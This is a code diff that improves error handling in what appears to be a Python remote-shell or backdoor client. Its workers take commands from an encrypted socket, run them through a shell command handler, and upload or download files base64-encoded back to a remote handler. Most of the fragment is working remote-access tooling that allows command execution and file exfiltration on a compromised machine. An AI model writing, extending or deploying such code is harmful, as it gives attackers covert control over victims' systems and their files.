@@ -56,28 +56,34 @@ class MessageWorker: # Base class for adding a message worker
 class UserInputWorker(MessageWorker):
 
 	def file_shell_to_handler(self, filename):
-		with open(filename, "rb") as r:
-			for line in r.readlines():
-				self.send(base64.b64encode(line))
-			self.send("EOF")
+		try:
+			with open(filename, "rb") as r:
+				for line in r.readlines():
+					self.send(base64.b64encode(line))
+				self.send("EOF")
+			return "Download complete"
+		except Exception as e:
+			return str(e)
 				
 	def file_handler_to_shell(self, filename):
-		with open(filename, "wb") as w:
-			while True:
-				data = self.input_queue.get()
-				if data == "EOF": break
-				w.write(base64.b64decode(data))
+		try:
+			with open(filename, "wb") as w:
+				while True:
+					data = self.input_queue.get()
+					if data == "EOF": break
+					w.write(base64.b64decode(data))
+			return "Upload complete"
+		except Exception as e:
+			return str(e)
 			
 	def run(self):
 		while True:
 			print "trying to get data!"
 			data = self.input_queue.get()
 			if data.startswith("download"):
-				self.file_shell_to_handler(data.split()[1])
-				output = "ok"
+				output = self.file_shell_to_handler(data.split()[1])
 			elif data.startswith("upload"):
-				self.file_handler_to_shell(data.split()[1])
-				output = "ok"
+				output = self.file_handler_to_shell(data.split()[1])
 			else:
 				output = shell_commands.handle_command(data)
 			output += "\n"+os.getcwd()+">> "
@@ -86,7 +92,7 @@ class UserInputWorker(MessageWorker):
 class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
 	def run(self):
 		while True:
-			comm_socket.sendall(EncodeAES(output_queue.get()))	
+			comm_socket.sendall(EncodeAES(output_queue.get()))
 		
 workers = []
 transmit_worker = TransmitWorker(chr(0)) # Create workers
